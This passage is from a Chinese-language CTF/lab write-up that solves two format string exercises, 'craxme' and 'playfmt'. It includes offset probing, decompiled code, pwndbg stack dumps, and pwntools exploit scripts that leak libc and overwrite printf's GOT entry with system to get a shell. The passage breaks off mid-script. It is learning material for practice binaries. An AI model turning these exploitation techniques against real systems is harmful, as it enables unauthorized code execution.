+<p>这好像有两个分支都是对的？不懂作者啥意思，跟上一题没啥区别，直接用pwntools的<code>fmtstr_payload</code>搞定。</p>
+<p><strong>writeup</strong></p>
+<p>首先测试一下偏移，可以得到偏移为7.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab8# .&#x2F;craxme</span><br><span class="line">Please crax me !</span><br><span class="line">Give me magic :aaaa.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X</span><br><span class="line">aaaa.FF8C240C.100.0.F7D41438.93C.F7D41CC8.61616161.2E58252E.252E5825.58252E58.2E58252E</span><br><span class="line">&#x3D;�҂q���$��d$������You need be a phd</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>fmtstr_payload</code>构造exp，加个选项对两种不同情况。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./craxme&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./craxme&quot;</span>)</span><br><span class="line"></span><br><span class="line">magic_addr = elf.sym[<span class="string">&quot;magic&quot;</span>]</span><br><span class="line">args = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> args==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;magic_addr:<span class="number">0xda</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;magic_addr:<span class="number">0xFACEB00C</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give me magic :&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>搞定。</p>
+<h3 id="lab9"><a href="#lab9" class="headerlink" title="lab9"></a>lab9</h3><p>这是一道格式化字符串漏洞的进阶题目，相比前面直接的利用难一点，参考了好多资料才理清楚流程。题目基本信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab9# file .&#x2F;playfmt</span><br><span class="line">.&#x2F;playfmt: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;157fb5ec4301a1a1bddebb3c0f79c17305c57693, not stripped</span><br><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab9# checksec .&#x2F;playfmt</span><br><span class="line">[*] &#39;&#x2F;ctf&#x2F;work&#x2F;lab9&#x2F;playfmt&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">root@34c8834f:&#x2F;ctf&#x2F;work&#x2F;lab9# .&#x2F;playfmt</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">  Magic echo Server</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">aaaa.%X</span><br><span class="line">aaaa.8048640</span><br><span class="line">aaaa.%X.%X</span><br><span class="line">aaaa.8048640.4</span><br><span class="line">^C</span><br></pre></td></tr></table></figure>
+
+<p>也是一个格式化字符串程序，ida反编译。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> play();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主要代码在play函数-&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">play</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  Magic echo Server&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> do_fmt();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//play又调用了do_fmt()函数-&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fmt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">&quot;quit&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个无限读取buff然后printf打印的过程，遇到quit停止。与前面题目不同的是，这个buf不再是栈上的了，而是位于bss段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A060                 public buf</span><br><span class="line">.bss:0804A060 ; char buf[200]</span><br><span class="line">.bss:0804A060 buf             db 0C8h dup(?)          ; DATA XREF: do_fmt+E↑o</span><br><span class="line">.bss:0804A060                                         ; do_fmt+27↑o ...</span><br><span class="line">.bss:0804A060 _bss            ends</span><br><span class="line">.bss:0804A060</span><br></pre></td></tr></table></figure>
+
+<h4 id="非栈上buff的格式化字符串漏洞"><a href="#非栈上buff的格式化字符串漏洞" class="headerlink" title="非栈上buff的格式化字符串漏洞"></a>非栈上buff的格式化字符串漏洞</h4><p>这是格式化字符串的变体，这种题目必定是多次漏洞的形式，因为单次本身就无法实现利用。下面是查找到的一段关于此类题目的说明。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">出题人把格式化串放到堆或是bss段中，不能和原来的一样那样去读取格式化字符串串中的目标地址，不在栈中你是不可能读到的。对于这种题目的做法就是要进行两次漏洞利用，第一次将当前题目变成常规题目样式。第二次就成了常规格式化字符串题目。</span><br><span class="line">具体指的是：</span><br><span class="line">    第一次：在栈中找一个指向栈里面的指针（这种指针肯定会有，因为堆栈框架就是这样的），往其写入第二次要写入的地址。</span><br><span class="line">    第二次：常规格式化字符串exp操作</span><br></pre></td></tr></table></figure>
+
+<p>具体针对这题的话，因为不和前面一样只是单纯的修改变量，而是需要实现完整的利用，所以思路是</p>
+<ul>
+<li>利用格式化字符串漏洞泄露libc地址得到system地址</li>
+<li>写got表劫持printf函数到system</li>
+<li>buf传入”/bin/sh”得到shell</li>
+</ul>
+<p>首先用gdb调试下，在<code>call printf</code>处下断，看一下栈内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint *0x0804853B</span><br><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffa1c750 —▸ 0x804a060 (buf) ◂— &#39;aaaaaaaaaaaaaaaaa\n&#39;</span><br><span class="line">01:0004│      0xffa1c754 —▸ 0x8048640 ◂— jno    0x80486b7 &#x2F;* &#39;quit&#39; *&#x2F;</span><br><span class="line">02:0008│      0xffa1c758 ◂— 0x4</span><br><span class="line">03:000c│      0xffa1c75c —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffa1c760 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d &#x2F;* &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39; *&#x2F;</span><br><span class="line">05:0014│      0xffa1c764 ◂— 0x0</span><br><span class="line">06:0018│ ebp  0xffa1c768 —▸ 0xffa1c778 —▸ 0xffa1c788 ◂— 0x0</span><br><span class="line">07:001c│      0xffa1c76c —▸ 0x8048584 (play+59) ◂— nop</span><br><span class="line">08:0020│      0xffa1c770 —▸ 0xf7fc0d80 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffa1c774 ◂— 0x0</span><br><span class="line">0a:0028│      0xffa1c778 —▸ 0xffa1c788 ◂— 0x0</span><br><span class="line">0b:002c│      0xffa1c77c —▸ 0x80485b1 (main+42) ◂— nop</span><br><span class="line">0c:0030│      0xffa1c780 —▸ 0xf7fe39b0 (_dl_fini) ◂— push   ebp</span><br><span class="line">0d:0034│      0xffa1c784 —▸ 0xffa1c7a0 ◂— 0x1</span><br><span class="line">0e:0038│      0xffa1c788 ◂— 0x0</span><br><span class="line">0f:003c│      0xffa1c78c —▸ 0xf7e00e81 (__libc_start_main+241) ◂— add    esp,</span><br><span class="line"> 0x10</span><br><span class="line">10:0040│      0xffa1c790 —▸ 0xf7fc0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br><span class="line">... ↓</span><br><span class="line">12:0048│      0xffa1c798 ◂— 0x0</span><br><span class="line">13:004c│      0xffa1c79c —▸ 0xf7e00e81 (__libc_start_main+241) ◂— add    esp,</span><br><span class="line"> 0x10</span><br></pre></td></tr></table></figure>
+
+<p>注意到，栈上存放了<code>__libc_start_main</code>地址，可以用来计算libc地址,同时由于涉及到利用栈上变量当跳板，需要泄露出esp值,第一次payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;%6$p.%15$p&quot;</span><br><span class="line">input()</span><br><span class="line">p.sendlineafter(&quot;  Magic echo Server\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;,payload)</span><br><span class="line">p.recvuntil(&#39;0x&#39;)</span><br><span class="line">esp_addr&#x3D;int(p.recv(8),16)-0x28</span><br><span class="line">p.recvuntil(&#39;0x&#39;)</span><br><span class="line">libc_main_addr&#x3D;int(p.recv(8),16)-241</span><br><span class="line">obj &#x3D; LibcSearcher(&quot;__libc_start_main&quot;, libc_main_addr)</span><br><span class="line">libc_addr &#x3D; libc_main_addr - obj.dump(&quot;__libc_start_main&quot;)</span><br><span class="line">system_addr &#x3D; libc_addr + obj.dump(&quot;system&quot;)</span><br><span class="line">success(&quot;esp addr:&#123;:#x&#125; &quot;.format(esp_addr))</span><br><span class="line">success(&quot;system addr:&#123;:#x&#125; &quot;.format(system_addr))</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以得到此时esp值和<code>lib_start_main</code>地址(减去偏移241就得到了)，进一步得到libc地址与system地址。</p>
+<p>这一步执行完后查看栈布局：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 60</span><br><span class="line">00:0000│ esp  0xffe64450 —▸ 0x804a060 (buf) ◂— &#39;bbbb\n%15$p\n&#39;</span><br><span class="line">01:0004│      0xffe64454 —▸ 0x8048640 ◂— jno    0x80486b7 &#x2F;* &#39;quit&#39; *&#x2F;</span><br><span class="line">02:0008│      0xffe64458 ◂— 0x4</span><br><span class="line">03:000c│      0xffe6445c —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffe64460 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d &#x2F;* &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39; *&#x2F;</span><br><span class="line">05:0014│      0xffe64464 ◂— 0x0</span><br><span class="line">06:0018│ ebp  0xffe64468 —▸ 0xffe64478 —▸ 0xffe64488 ◂— 0x0</span><br><span class="line">07:001c│      0xffe6446c —▸ 0x8048584 (play+59) ◂— nop</span><br><span class="line">08:0020│      0xffe64470 —▸ 0xf7ec7d80 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffe64474 ◂— 0x0</span><br><span class="line">0a:0028│      0xffe64478 —▸ 0xffe64488 ◂— 0x0</span><br><span class="line">0b:002c│      0xffe6447c —▸ 0x80485b1 (main+42) ◂— nop</span><br><span class="line">0c:0030│      0xffe64480 —▸ 0xf7eea9b0 (_dl_fini) ◂— push   ebp</span><br><span class="line">0d:0034│      0xffe64484 —▸ 0xffe644a0 ◂— 0x1</span><br><span class="line">0e:0038│      0xffe64488 ◂— 0x0</span><br><span class="line">0f:003c│      0xffe6448c —▸ 0xf7d07e81 (__libc_start_main+241) ◂— add    esp,</span><br><span class="line"> 0x10</span><br><span class="line">10:0040│      0xffe64490 —▸ 0xf7ec7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br><span class="line">... ↓</span><br><span class="line">12:0048│      0xffe64498 ◂— 0x0</span><br><span class="line">13:004c│      0xffe6449c —▸ 0xf7d07e81 (__libc_start_main+241) ◂— add    esp,</span><br><span class="line"> 0x10</span><br><span class="line">14:0050│      0xffe644a0 ◂— 0x1</span><br><span class="line">15:0054│      0xffe644a4 —▸ 0xffe64534 —▸ 0xffe648b9 ◂— &#39;.&#x2F;playfmt&#39;</span><br><span class="line">16:0058│      0xffe644a8 —▸ 0xffe6453c —▸ 0xffe648c3 ◂— &#39;LC_ALL&#x3D;en_US.UTF-8&#39;</span><br><span class="line">17:005c│      0xffe644ac —▸ 0xffe644c4 ◂— 0x0</span><br><span class="line">18:0060│      0xffe644b0 ◂— 0x1</span><br><span class="line">19:0064│      0xffe644b4 ◂— 0x0</span><br><span class="line">1a:0068│      0xffe644b8 —▸ 0xf7ec7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br><span class="line">1b:006c│      0xffe644bc —▸ 0xf7eea75a (call_init.part+26) ◂— add    edi, 0x178a6</span><br><span class="line">1c:0070│      0xffe644c0 —▸ 0xf7f02000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34</span><br><span class="line">1d:0074│      0xffe644c4 ◂— 0x0</span><br><span class="line">1e:0078│      0xffe644c8 —▸ 0xf7ec7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c</span><br><span class="line">1f:007c│      0xffe644cc ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">21:0084│      0xffe644d4 ◂— 0xc785620b</span><br><span class="line">22:0088│      0xffe644d8 ◂— 0xabf0a41b</span><br><span class="line">23:008c│      0xffe644dc ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">26:0098│      0xffe644e8 ◂— 0x1</span><br><span class="line">27:009c│      0xffe644ec —▸ 0x8048400 (_start) ◂— xor    ebp, ebp</span><br><span class="line">28:00a0│      0xffe644f0 ◂— 0x0</span><br><span class="line">29:00a4│      0xffe644f4 —▸ 0xf7eefe20 (_dl_runtime_resolve+16) ◂— pop    edx</span><br><span class="line">2a:00a8│      0xffe644f8 —▸ 0xf7eea9b0 (_dl_fini) ◂— push   ebp</span><br><span class="line">2b:00ac│      0xffe644fc —▸ 0xf7f02000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34</span><br><span class="line">2c:00b0│      0xffe64500 ◂— 0x1</span><br><span class="line">2d:00b4│      0xffe64504 —▸ 0x8048400 (_start) ◂— xor    ebp, ebp</span><br><span class="line">2e:00b8│      0xffe64508 ◂— 0x0</span><br><span class="line">2f:00bc│      0xffe6450c —▸ 0x8048421 (_start+33) ◂— hlt</span><br><span class="line">30:00c0│      0xffe64510 —▸ 0x8048587 (main) ◂— lea    ecx, [esp + 4]</span><br><span class="line">31:00c4│      0xffe64514 ◂— 0x1</span><br><span class="line">32:00c8│      0xffe64518 —▸ 0xffe64534 —▸ 0xffe648b9 ◂— &#39;.&#x2F;playfmt&#39;</span><br><span class="line">33:00cc│      0xffe6451c —▸ 0x80485c0 (__libc_csu_init) ◂— push   ebp</span><br><span class="line">34:00d0│      0xffe64520 —▸ 0x8048620 (__libc_csu_fini) ◂— ret</span><br><span class="line">35:00d4│      0xffe64524 —▸ 0xf7eea9b0 (_dl_fini) ◂— push   ebp</span><br><span class="line">36:00d8│      0xffe64528 —▸ 0xffe6452c —▸ 0xf7f02940 ◂— 0x0</span><br><span class="line">37:00dc│      0xffe6452c —▸ 0xf7f02940 ◂— 0x0</span><br><span class="line">38:00e0│      0xffe64530 ◂— 0x1</span><br><span class="line">39:00e4│      0xffe64534 —▸ 0xffe648b9 ◂— &#39;.&#x2F;playfmt&#39;</span><br><span class="line">3a:00e8│      0xffe64538 ◂— 0x0</span><br><span class="line">3b:00ec│      0xffe6453c —▸ 0xffe648c3 ◂— &#39;LC_ALL&#x3D;en_US.UTF-8&#39;</span><br></pre></td></tr></table></figure>
+
+<p>理一下思路，目前我们已经知道了system地址，只需要将其写入printf的got表，其地址为0804A010，就齐活了-&gt;但是栈上并没有printf_got地址，所以我们需要做的是将printf_got地址写入栈上某个位置-&gt;需要找到栈上存放了栈地址的内存位置，利用格式化字符串漏洞写入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048380+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A018                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0804A020 off_804A020     dd offset strncmp       ; DATA XREF: _strncmp↑r</span><br><span class="line">.got.plt:0804A020 _got_plt        ends</span><br></pre></td></tr></table></figure>
+
+<p>我们的需求结合调试的栈上情况分析如下：</p>
+<ul>
+<li>需要存放了栈上地址的栈地址作为跳板，形象地说就是：栈地址-&gt;栈地址-&gt;栈地址(这个之所以选择栈地址的目的就是为了尽量减少需要修改的字节数量，毕竟数量一多格式化字符串前面的%{n}c就越大，也就越慢了，甚至解不出来)<ul>
+<li>可以选择0x15  0x16<ul>
+<li>0x15-&gt;0x39-&gt;栈地址</li>
+<li>0x16-&gt;0x3b-&gt;栈地址</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">15:0054│      0xffe644a4 —▸ 0xffe64534 —▸ 0xffe648b9 ◂— &#39;.&#x2F;playfmt&#39;</span><br><span class="line">16:0058│      0xffe644a8 —▸ 0xffe6453c —▸ 0xffe648c3 ◂— &#39;LC_ALL&#x3D;en_US.UTF-8&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>需要存放0x0804xxxx的栈地址，这样的目的是got表也是0x0804xxxx，这样可以只用修改低2字节。下面是所选的两个，当然，其他的也是可以的，不唯一。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">07:001c│      0xffe6446c —▸ 0x8048584 (play+59) ◂— nop</span><br><span class="line">0b:002c│      0xffe6447c —▸ 0x80485b1 (main+42) ◂— nop</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是利用漏洞进行挨个推算，步骤如下。</p>
+<ul>
+<li>0x15存放的0x39处地址，在此处利用漏洞(%21$hn)将0x39处值修改为0x7地址</li>
+<li>0x16存放的0x3b处地址，在此处利用漏洞(%22$hn)将0x3b处值修改为0xb地址</li>
+<li>此时0x39存放的0x7地址，0x3b存放的0xb地址</li>
+<li>在0x39处利用漏洞(%57$hn)利用漏洞将0x7处存放的值改为printf_got地址</li>
+<li>在0x3b处利用漏洞(%59$hn)利用漏洞将0xb处存放的值改为printf_got+2地址</li>
+<li>至此已经将printf_got以及printf_got+2地址放入了栈上0x7和0xb处。</li>
+<li>利用漏洞将printf_got和printf_got+2两个地址处的双字节修改为system高双字节和低双字节地址</li>
+<li>最后传入”/bin/sh”，在程序调用printf时便实现劫持得到shell</li>
+</ul>
+<p><strong>writeup</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hhn</span>(<span class="params">addr,offset</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&#123;addr&#125;c%&#123;offset&#125;$hhn&quot;</span>.format(addr=addr,offset=offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hn</span>(<span class="params">addr,offset</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&#123;addr&#125;c%&#123;offset&#125;$hn&quot;</span>.format(addr=addr,offset=offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./playfmt&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./playfmt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 leak esp and libc</span></span><br><span class="line">payload = <span class="string">&quot;%6$p.%15$pstep1\x00&quot;</span></span><br><span class="line">input()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;  Magic echo Server\n=====================\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">esp_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-0x28</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_main_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-241</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_main_addr)</span><br><span class="line">libc_addr = libc_main_addr - obj.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">system_addr = libc_addr + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;esp addr:&#123;:#x&#125; &quot;</span>.format(esp_addr))</span><br><span class="line">success(<span class="string">&quot;system addr:&#123;:#x&#125; &quot;</span>.format(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 change 0x39 and 0x3b with 0x15 0x16</span></span><br><span class="line">payload = hn((esp_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xffff</span>,<span class="number">0x15</span>)</span><br><span class="line">payload += hn(((esp_addr+<span class="number">0x2c</span>)&amp;<span class="number">0xffff</span>-(esp_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xffff</span>)%<span class="number">0xffff</span>,<span class="number">0x16</span>)</span><br><span class="line">payload += <span class="string">&#x27;step2\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span 